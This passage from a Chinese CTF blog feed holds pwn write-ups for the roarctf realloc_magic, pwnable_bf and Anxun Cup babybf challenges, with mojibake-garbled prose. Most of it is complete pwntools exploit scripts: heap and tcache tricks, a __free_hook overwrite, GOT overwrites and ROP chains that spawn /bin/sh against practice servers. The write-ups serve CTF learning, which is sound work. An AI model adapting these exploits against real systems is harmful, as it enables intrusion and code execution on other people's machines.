class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hh&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27244</span>)<br><span class="hljs-comment">#p = process(&#x27;./hh&#x27;)</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendgadget</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget) // <span class="hljs-number">4</span><br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xffffffff</span><br>        result += p32(<span class="hljs-number">9</span>) + p32(t) + p32(<span class="hljs-number">0xd</span>) + p32(<span class="hljs-number">0x7d6</span> + i)<br>        gadget = gadget &gt;&gt; <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> result<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>code = p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d4</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d5</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d6</span> + <span class="hljs-number">8</span>) + p32(<span class="hljs-number">11</span>) + p32(<span class="hljs-number">0x7d7</span> + <span class="hljs-number">8</span>)<br>code += p32(<span class="hljs-number">0xe</span>) * <span class="hljs-number">4</span><br>p.sendafter(<span class="hljs-string">b&#x27;code:&#x27;</span>, code)<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>leak1 =  <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span><br>leak2 = leak1 + <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>leak3 =  <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">32</span><br>stack = leak3 + <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>libcbase = leak2  - <span class="hljs-number">240</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x21112</span><br>pop_rsi = libcbase + <span class="hljs-number">0x202f8</span><br>pop_rdx = libcbase + <span class="hljs-number">0x1b92</span><br>pop_rax = libcbase + <span class="hljs-number">0x3a738</span> <br>ret = libcbase + <span class="hljs-number">0x937</span><br>syscall_ret = libcbase + <span class="hljs-number">0xbc3f5</span><br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = flat(<br>    p64(pop_rdi), p64(stack + <span class="hljs-number">0xb0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(stack + <span class="hljs-number">0x100</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">0</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(stack + <span class="hljs-number">0x100</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">1</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span><br>code = sendgadget(payload)<br>p.sendafter(<span class="hljs-string">b&#x27;code:&#x27;</span>, code)<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h3><p>Roderickå¸ˆå‚…çš„<a href="https://roderickchan.github.io/2021/03/28/roarctf-2019-realloc-magic/">è¿™ç¯‡</a>å·²ç»å†™å¾—å¾ˆå¥½äº†ï¼Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯ä½¿ç”¨reallocå‡½æ•°ï¼Œåœ¨æ‰©å¤§å†…å­˜æ—¶ï¼Œå¹¶ä¸”tcacheä¸­æ­£å¥½æœ‰è¯¥å¤§å°çš„chunkï¼Œè¿™æ—¶ä¹Ÿå¹¶ä¸ä¼šå»ä½¿ç”¨tcacheä¸­çš„chunkã€‚</p><p>â€‹                         </p><p>è‡ªå·±å¤ç°çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;roarctf_2019_realloc_magic&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./roarctf_2019_realloc_magic&#x27;)</span><br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">realloc</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    <span class="hljs-keyword">if</span> size != <span class="hljs-number">0</span>:<br>        p.sendafter(<span class="hljs-string">b&#x27;Content?&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    realloc(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free()<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + <span class="hljs-string">b&#x27;\x60\xc7&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - <span class="hljs-number">4118704</span><br>    free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    onegadget = libcbase + <span class="hljs-number">0x4f322</span><br><br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br>    realloc(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        free()<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) + p64(free_hook))<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    realloc(<span class="hljs-number">0x80</span>, p64(onegadget))<br>    free()<br>    p.interactive()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span> :<br>        p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28369</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><p>â€‹                                                 </p><p>â€‹                                            </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bfè§£é‡Šå™¨</title>
    <link href="/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/"/>
    <url>/2022/12/12/bf%E8%A7%A3%E9%87%8A%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å¼ºç½‘æ‹Ÿæ€å’Œå®‰æ´µæ¯ä¸Šéƒ½å‡ºç°äº†bfè§£é‡Šå™¨çš„é¢˜ï¼Œè‡ªå·±è¿˜æ˜¯å¤´ä¸€å›è§ï¼Œåœ¨æ­¤å­¦ä¹ ä¸€ä¸‹ã€‚</p><p>Brainfuckï¼Œç®€ç§°BFï¼Œæ˜¯ä¸€ç§æå°åŒ–çš„ç¨‹åºè¯­è¨€</p><img src="/img/7/Screenshot_20221230_014458.png" style="zoom: 67%;" /><h3 id="pwnable-bf"><a href="#pwnable-bf" class="headerlink" title="pwnable_bf"></a>pwnable_bf</h3><p>é¦–å…ˆçœ‹ä¸€é“pwnable_bfï¼ˆbuuå’Œpwnable.krä¸Šéƒ½æœ‰ï¼‰</p><p>å…¶ä¸»å‡½æ•°ä¸­å…¨å±€å˜é‡pæŒ‡å‘å…¨å±€å˜é‡tapeçš„åœ°å€ï¼Œè¾“å…¥ä¸€æ®µå­—ç¬¦åå°±è®©æ¯ä¸ªå­—ç¬¦è¿›å…¥do_brainfuckå‡½æ•°ï¼š</p><img src="/img/7/Screenshot_20221230_014948.png" style="zoom: 80%;" /><p>â€‹                                  </p><p>åœ¨do_brainfuckå‡½æ•°ä¸­å°±æ˜¯å¯¹æŒ‡é’ˆpçš„æ“ä½œï¼Œæ¯ä¸€ä¸ªå­—ç¬¦å®é™…ä¸Šå°±å¯¹åº”äº†bfè§£é‡Šå™¨çš„æ“ä½œï¼›æ¼æ´ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯æŒ‡é’ˆpå¯¹åº”tapeçš„åœ°å€çš„å˜åŒ–æ²¡æœ‰åšå‡ºé™åˆ¶ï¼Œè¿™å°±è®©æŒ‡é’ˆpæŒ‡å‘gotè¡¨ï¼š</p><img src="/img/7/Screenshot_20221230_015016.png" style="zoom: 80%;" /><p>â€‹                                                        </p><p>æ³„æ¼åœ°å€libcåœ°å€åå¯ä»¥ç»§ç»­ä½¿ç”¨çš„å°±åªæœ‰putcharå‡½æ•°å’Œgetcharå‡½æ•°ï¼Œç”±äºå¯¹gotè¡¨çš„è¯»å†™éƒ½åªèƒ½æ˜¯ä¸€å­—èŠ‚ï¼Œgetcharå‡½æ•°å¯¹è‡ªå·±çš„gotè¡¨ä¿®æ”¹åˆ°ä¸€åŠå°±ä¼šå…ˆå¤±æ•ˆï¼Œæ‰€ä»¥åªèƒ½ä¿®æ”¹putcharå‡½æ•°çš„gotè¡¨ï¼›è€Œputcharå‡½æ•°çš„å‚æ•°åªèƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œæ— æ³•å®Œæˆâ€&#x2F;bin&#x2F;shâ€çš„è°ƒç”¨ï¼Œæ‰€ä»¥ä¿®æ”¹putcharå‡½æ•°ä¸º_startã€memsetå‡½æ•°ä¸ºgetså‡½æ•°ã€fgetså‡½æ•°ä¸ºsystemå‡½æ•°å³å¯ã€‚</p><p>å®Œæ•´çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bf&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./bf&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25595</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br>payload = <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x7c</span>  + <span class="hljs-string">b&#x27;.&gt;&#x27;</span> * <span class="hljs-number">4</span>  <span class="hljs-comment">#æ³„æ¼__libc_start_mainçš„åœ°å€</span><br>payload += <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">4</span> <span class="hljs-comment">#ä¿®æ”¹fgetså‡½æ•°çš„åœ°å€</span><br>payload += <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;,&gt;&#x27;</span> * <span class="hljs-number">8</span><span class="hljs-comment">#ä¿®æ”¹memsetå‡½æ•°å’Œputcharå‡½æ•°</span><br>payload += <span class="hljs-string">b&#x27;.&#x27;</span><span class="hljs-comment">#è°ƒç”¨putcharå‡½æ•°</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;[ ]&#x27;</span>, payload)<br>leak = u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><br>libcbase = leak - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>gets = libcbase + libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>getchar(p32(sys_addr))<br>getchar(p32(gets))<br>getchar(p32(<span class="hljs-number">0x80484e0</span>))<br><br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="å®‰æ´µæ¯babybf"><a href="#å®‰æ´µæ¯babybf" class="headerlink" title="å®‰æ´µæ¯babybf"></a>å®‰æ´µæ¯babybf</h3><p>æœ¬åœ°ç¯å¢ƒï¼š2.27-3ubuntu1.6_amd64</p><p>å®‰æ´µæ¯çš„è¿™é“é¢˜å¾ˆæŠ½è±¡</p><h4 id="v3æ•°ç»„"><a href="#v3æ•°ç»„" class="headerlink" title="v3æ•°ç»„"></a>v3æ•°ç»„</h4><p>å‡½æ•°sub_142Fçš„å¼€å¤´å°±æ˜¯ä¸€äº›å‡½æ•°èµ‹å€¼ç»™v3æ•°ç»„ï¼Œè¿™äº›å‡½æ•°ç›´æ¥å»çœ‹æ˜¯å®Œå…¨ä¸çŸ¥é“å…¶æ„ä¹‰ï¼Œæ‰€ä»¥è¾¹è°ƒè¯•è¾¹å»é˜…è¯»å¯ä»¥å¾ˆå¥½å¾—å¸®åŠ©ç†è§£ã€‚</p><p>å‡½æ•°æ ˆçš„æ’å¸ƒå¦‚ä¸‹ï¼š</p><img src="/img/7/Screenshot_20221230_032525.jpg" style="zoom: 67%;" /><p>â€‹                                                                                        </p><p>è¿™é‡Œä»¥å‡½æ•°sub_16F6ä¸ºä¾‹å­</p><img src="/img/7/Screenshot_20221230_040603.png" style="zoom: 67%;" /><ol><li><p>rbp-0A8ä¸­çš„å€¼(0x7ffc6a1b48d0)åŠ 1</p></li><li><p>rbp-0B0ä¸­çš„å€¼(0x562b3853e261)åŠ 1</p></li><li><p>eaxèµ‹ä¸Šåœ°å€0x562b3853e261ä¸­çš„å€¼(1å­—èŠ‚) </p></li><li><p>mov  rax, [rbp+rax*8-80h]   ï¼ˆraxèµ‹ä¸Šv3æ•°ç»„çš„å‡½æ•°åœ°å€ï¼Œrax  &#x3D;  v3[rax]ï¼‰</p></li><li><p>jmp     rax</p></li></ol><p>å†å¯¹ç…§å‡½æ•°sub_16F6ä¼ªä»£ç å°±å¯ä»¥çŸ¥é“å‡½æ•°çš„ä½œç”¨äº†</p><p><img src="/img/7/Screenshot_20221230_042441.png"></p><p>â€‹                              </p><p>å®é™…ä¸Š<code>rbp-0A8</code>å°±æ˜¯bfè§£é‡Šå™¨çš„æŒ‡é’ˆï¼Œ<code>rbp-0B0</code>ä¸­å‚¨å­˜ç€ä¸‹ä¸€æŒ‡ä»¤ï¼Œæ‰€ä»¥è¿™äº›å‡½æ•°ä½œç”¨å¦‚ä¸‹ï¼š</p> <img src="/img/7/Screenshot_20221230_043330.png" style="zoom:80%;" /><h4 id="å­—ç¬¦è½¬åŒ–"><a href="#å­—ç¬¦è½¬åŒ–" class="headerlink" title="å­—ç¬¦è½¬åŒ–"></a>å­—ç¬¦è½¬åŒ–</h4><p>è¿™é“é¢˜å¹¶æ²¡æœ‰ç›´æ¥ç»™ä½ <code>&quot;&gt;  &lt;  ,  .&quot;</code> è¿™äº›å­—ç¬¦ï¼Œè€Œæ˜¯åœ¨ä½ è¾“å…¥ä¸€æ®µå­—ç¬¦åï¼Œåˆå»ä½¿ç”¨dword_2020æ•°ç»„è¿›è¡Œä¸€æ­¥è½¬åŒ–</p><img src="/img/7/Screenshot_20221230_034137.png" style="zoom: 80%;" /><p>dword_2020æ•°ç»„éƒ¨åˆ†å†…å®¹å¦‚ä¸‹ï¼š</p><img src="/img/7/Screenshot_20221230_032203.jpg" style="zoom:67%;" /><p>â€‹                                                                                           </p><p>è§„å¾‹å¦‚ä¸‹ï¼š[è¾“å…¥çš„å€¼(asciiç )&#x3D;&gt;è½¬åŒ–åçš„å€¼]</p><p><code>[0=&gt;8][1=&gt;9][43=&gt;2][44=&gt;5][45=&gt;3][46=&gt;4][60=&gt;0][62=&gt;1][91=&gt;6][93=&gt;7]</code></p><p>è¾“å…¥çš„å€¼æ˜¯å­—ç¬¦ï¼Œåœ¨å†…å­˜ä¸­ä»¥asciiç å‚¨å­˜ï¼Œè½¬åŒ–åçš„å€¼åˆæ˜¯å¯¹åº”v3æ•°ç»„ä¸­çš„å¼•ç´¢ã€‚</p><p>ä¾‹å¦‚å­—ç¬¦<code>&#39;&gt;&#39;</code>çš„asciiç ä¸º62ï¼Œè½¬åŒ–åçš„å€¼ä¸º1ï¼Œæœ€åå¯¹åº”v3[1]ä¸­å‡½æ•°çš„æ‰§è¡Œã€‚</p><h4 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h4><p>è™½ç„¶è¿™é“é¢˜ä¸åƒpwnable_bfä¸­å¾ˆç›´æ¥ç»™å‡ºbfè§£é‡Šå™¨çš„æ“ä½œï¼Œä½†æ˜¯ç»è¿‡ä¸€ç³»åˆ—è½¬åŒ–åä¹ŸåŒæ ·è¾¾åˆ°äº†bfè§£é‡Šå™¨çš„æ•ˆæœã€‚</p><p>æ“ä½œçš„æŒ‡é’ˆæ˜¯<code>rbp-0A8</code>ï¼Œå…¶é‡Œé¢çš„å€¼ä¹Ÿæ˜¯æ ˆä¸Šçš„å€¼ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å¯¹æ ˆä¸Šä»»æ„å€¼è¯»å†™ï¼Œæ‰€ä»¥æ³„æ¼__libc_start_mainå‡½æ•°åœ°å€åç›´æ¥ROP</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;chall&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#s = [0,8][1,9][43,2][44,5][45,3][46,4][60,0][62,1][91,6][93,7]</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;len&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>).encode())<br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x58</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x28</span> + (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">0x20</span><br>p.sendafter(<span class="hljs-string">b&#x27;code&gt;&#x27;</span>, payload)<br>leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">231</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>payload = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>getchar(payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="å¼ºç½‘æ‹Ÿæ€bfbf"><a href="#å¼ºç½‘æ‹Ÿæ€bfbf" class="headerlink" title="å¼ºç½‘æ‹Ÿæ€bfbf"></a>å¼ºç½‘æ‹Ÿæ€bfbf</h3><p><a href="https://xtxtn.github.io/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/#bfbf">å¼ºç½‘æ‹Ÿæ€2022pwn - xtxtnâ€™s Blog</a></p><p>â€‹                            </p><p>â€‹                       </p><p>â€‹                  </p><p>å‚è€ƒï¼š<a href="https://zh.wikipedia.org/wiki/Brainfuck">Brainfuck - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦ (wikipedia.org)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¼ºç½‘æ‹Ÿæ€2022pwn</title>
    <link href="/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/"/>
    <url>/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/</url>
    
